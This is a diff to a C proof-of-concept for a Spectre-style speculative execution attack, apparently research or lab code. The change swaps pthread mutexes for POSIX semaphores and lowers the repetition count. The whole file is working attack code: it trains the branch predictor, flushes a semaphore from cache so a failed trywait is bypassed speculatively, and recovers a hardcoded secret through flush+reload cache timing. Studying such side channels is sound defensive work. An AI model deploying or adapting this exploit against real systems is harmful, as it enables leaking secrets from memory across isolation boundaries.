@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <time.h>
 #include <pthread.h>
+#include <semaphore.h>
 
 #include "../lib/gen_array.c"
 #include "../lib/time_and_flush.c"
@@ -9,10 +10,11 @@
 #define CACHE_HIT   100
 #define N_PAGES     256
 
-#define REPETITIONS 10000
+#define REPETITIONS 100
 #define N_TRAINING  10
 #define SECRET_SIZE 9
 #define SECRET      "mysecret"
+#define SEM_COUNT   1
 
 #define false       0
 #define true        1
@@ -23,57 +25,57 @@
 
 cp_t* flush_reload_arr;
 
-void attack_func(pthread_mutex_t* lock_ptr,
-                 int* lock_val_ptr, int secret_index) {
-    if(pthread_mutex_trylock(lock_ptr) != 0) return;
-    *lock_val_ptr = secret_index;
-    pthread_mutex_unlock(lock_ptr);
+void attack_func(sem_t* sem_ptr,
+                 int* sem_val_ptr, int secret_index) {
+    if(sem_trywait(sem_ptr) != 0) return;
+    *sem_val_ptr = secret_index;
+    sem_post(sem_ptr);
     volatile cp_t cp;
-    cp = flush_reload_arr[SECRET[*lock_val_ptr]];
+    cp = flush_reload_arr[SECRET[*sem_val_ptr]];
 }
 
 /*
  * Variables required in cache:
- *  lock0_var
+ *  sem0_var
  *  secret_index
  * Variables required in mem:
- *  lock0
+ *  sem0
  *
- * Training: lock_index=1   secret_index=0
- * Attack:   lock_index=0   secret_index={iterate through SECRET}
+ * Training: sem_index=1   secret_index=0
+ * Attack:   sem_index=0   secret_index={iterate through SECRET}
  */
-void victim_func(int lock_index, int secret_index) {
-    //creates 2 locks. put addresses in array to prevent branches (fools branch predictor).
-    pthread_mutex_t lock0, lock1;
-    pthread_mutex_init(&lock0, FLAG);
-    pthread_mutex_init(&lock1, FLAG);
-    int n_locks = 2;
-    pthread_mutex_t* lock01_addresses[n_locks];
-    lock01_addresses[0] = &lock0;
-    lock01_addresses[1] = &lock1;
-    int  lock0_var, lock1_var;
-    int* lock0or1var_addresses[n_locks];
-    lock0or1var_addresses[0] = &lock0_var;
-    lock0or1var_addresses[1] = &lock1_var;
+void victim_func(int sem_index, int secret_index) {
+    //creates 2 semaphores. put addresses in array to prevent branches (fools branch predictor).
+    sem_t sem0, sem1;
+    sem_init(&sem0, 0, SEM_COUNT);
+    sem_init(&sem1, 0, SEM_COUNT);
+    int n_sems = 2;
+    sem_t* sem01_addresses[n_sems];
+    sem01_addresses[0] = &sem0;
+    sem01_addresses[1] = &sem1;
+    int  sem0_var, sem1_var;
+    int* sem0or1var_addresses[n_sems];
+    sem0or1var_addresses[0] = &sem0_var;
+    sem0or1var_addresses[1] = &sem1_var;
 
-    //lock either lock0 or lock1, depending on the parameter.
+    //lock either sem0 or sem1, depending on the parameter.
     //Branch predictor cannot determine which (no branches).
-    //Set value of respective lock0_var or lock1_var to 0.
-    pthread_mutex_t* lock0or1_address;
-    lock0or1_address = lock01_addresses[lock_index];
-    pthread_mutex_lock(lock0or1_address);
-    *lock0or1var_addresses[lock_index] = 0;
+    //Set value of respective sem0_var or sem1_var to 0.
+    sem_t* sem0or1_address;
+    sem0or1_address = sem01_addresses[sem_index];
+    sem_wait(sem0or1_address);
+    *sem0or1var_addresses[sem_index] = 0;
 
-    //Remove lock0 from cache, so that the branch will speculatively execute.
+    //Remove sem0 from cache, so that the branch will speculatively execute.
     cpuid();
-    flush(&lock0);
+    flush(&sem0);
     cpuid();
-    attack_func(&lock0, &lock0_var, secret_index);
+    attack_func(&sem0, &sem0_var, secret_index);
 
     cpuid();
-    pthread_mutex_unlock(lock0or1_address);
-    pthread_mutex_destroy(&lock0);
-    pthread_mutex_destroy(&lock1);
+    sem_post(sem0or1_address);
+    sem_destroy(&sem0);
+    sem_destroy(&sem1);
 }
 
 int* prepare(int secret_index) {
@@ -83,18 +85,18 @@ int* prepare(int secret_index) {
 
     //access decisions in array, repeated out-of-bounds not traceable for branch predictor
     int  n_accesses =   N_TRAINING + 1;
-    char lock_indices  [n_accesses];
+    char sem_indices   [n_accesses];
     char secret_indices[n_accesses];
     for(int i = 0;  i < n_accesses; i++) {
-        lock_indices  [i] = 1;
+        sem_indices   [i] = 1;
         secret_indices[i] = 0;
     }
-    lock_indices  [n_accesses-1] = 0;
+    sem_indices   [n_accesses-1] = 0;
     secret_indices[n_accesses-1] = secret_index;
     cpuid();
 
     for(int i = 0; i < n_accesses; i++) {
-        victim_func(lock_indices[i], secret_indices[i]);
+        victim_func(sem_indices[i], secret_indices[i]);
         cpuid();
         if(i < n_accesses-1) {
             cpuid();
